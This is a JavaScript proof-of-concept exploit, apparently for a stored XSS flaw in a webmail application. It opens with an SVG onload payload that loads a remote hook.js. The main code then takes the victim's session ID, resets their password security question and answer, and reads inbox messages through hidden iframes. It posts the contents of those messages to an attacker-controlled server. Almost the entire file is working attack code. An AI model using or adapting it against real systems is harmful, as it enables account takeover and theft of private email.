

/*



<svg/onload="var script = document.createElement('script');script.src = 'http://192.168.21.109:8888/hook.js';document.head.appendChild(script);document.writeln('test!');"/>




*/


var attacker_server = 'http://192.168.21.109:8888/'

var target_mail_server = 'http://192.168.21.109:6080'


async function post_data(url = "", data = {}) {
  const response = await fetch(url, {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    mode: "no-cors", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    headers: {
      "Content-Type": "application/json",
    },
    redirect: "follow",
    referrerPolicy: "no-referrer",
    body: JSON.stringify(data),
  });
  return response.json(); // parses JSON response into native JavaScript objects
}



function debug(msg) {
	document.writeln("</br>")
	document.writeln(msg)
	document.writeln("</br>")
}


function poc(target_mail_server, attacker_server, pwdquestion = "test", pwdanswer = "hello") {

	current_frame_url = window.location.href

	if(current_frame_url) {

		debug(current_frame_url)

		const params = new URLSearchParams(current_frame_url.split("?")[1])
		var sessid = params.get("sessid")
		// debug(`sessid: ${sessid}`)

		var msgid = params.get("msgid")
		// debug(`msgid: ${msgid}`)

		// var msgid = params.get("psid")
		// debug(`msgid: ${psid}`)

		var retid = params.get("retid")
		// debug(`retid: ${retid}`)



		var set_secure_answer_api = `${target_mail_server}/main.php?psid=${sessid}&pact=userinfo&popt=save`
		debug(`set_secure_answer_api: ${set_secure_answer_api}`)
		if(pwdquestion.length && pwdanswer.length) {
			fetch(`${set_secure_answer_api}`,{
			    	headers:{
			    		"Content-Type":"application/x-www-form-urlencoded"
			    	},
			        method: "POST",
			        Origin: window.location.protocol+"//"+window.location.host,
					// username=drunkbaby&userdomain=admin.com 在攻击时需要手动设置
			        body: `sessid=${sessid}&act=userinfo&opt=save&username=test&userdomain=admin.com&publicinfo=0&pwdquestion=${pwdquestion}&pwdanswer=${pwdanswer}&fullname=&mobile=&company=&department=&jobtitle=&office=&officephone=&homeaddress=&homephone=&description=`
			    }).then(res=>res.json()).then(json=>console.log(json));
		}
		var startMsgid = 2588;
		var endMsgid = 2590;

		for (var msgid = startMsgid; msgid <= endMsgid; msgid=msgid + 2) {
			preLoadMsg(msgid);
			callSleep();
			processMsgid(msgid); // 调用处理 msgid 的函数
		  }

	function preLoadMsg(msgid) {
		var preLoadURL = `${target_mail_server}/main.php?psid=${sessid}&pcat=readmsg&popt=`;
		// var preLoadData = `sessid=${sessid}&act=readmsg&opt=&folder=INBOX&msgid=${msgid}&pag=1&listcount=5&tofolder=&sortby=date&sortorder=DESC&nameto=&mailto=&listtype=&label=&search=testtesttesttesttesttest&selallpage=0`
		
		// debug(`preLoadData: ${preLoadData}`)
				fetch(`${preLoadURL}`,{
				    	headers:{
				    		"Content-Type":"application/x-www-form-urlencoded"
				    	},
				        method: "POST",
				        Origin: window.location.protocol+"//"+window.location.host,
				        body: `sessid=${sessid}&act=readmsg&opt=&folder=INBOX&msgid=${msgid}&pag=1&listcount=3&tofolder=&sortby=date&sortorder=DESC&nameto=&mailto=&listtype=&label=&search=teststestsetsetsttt&selallpage=0`
				    }).then(res=>res.json()).then(json=>console.log(json));
			

	}
		
	function processMsgid(msgid) {

		var read_mail_api = `${target_mail_server}/main.php?sessid=${sessid}&act=showbody&folder=INBOX&msgid=${msgid}&retid=${retid}`
		debug(`read_mail_api: ${read_mail_api}`)
		var sub_iframe = document.createElement('iframe');
		sub_iframe.src = `${read_mail_api}`
		sub_iframe.style.display = 'none';
		document.body.appendChild(sub_iframe);
		sub_iframe.addEventListener( "load", function(e) {
			var sub_iframe_document = sub_iframe.contentDocument || sub_iframe.contentWindow.document
			sub_iframe_source_data = sub_iframe_document.getElementsByTagName('html')[0].outerHTML
			console.log(sub_iframe_source_data)
			sub_iframe_source_data = escape(sub_iframe_source_data)
			post_data(`${attacker_server}?${sessid}`, {"api": read_mail_api, "data": sub_iframe_source_data}).then((data) => {
				console.log(data);
			});

		} );

	}

	function sendEmailOut() {
		
	}

	function sleep(ms) {
		return new Promise(resolve => setTimeout(resolve, ms));
	  }

	  async function callSleep() {
		// console.log('开始执行');
		await sleep(2000); // 延时2秒
		// console.log('延时2秒后执行');
	  }
}

}


poc(target_mail_server, attacker_server)




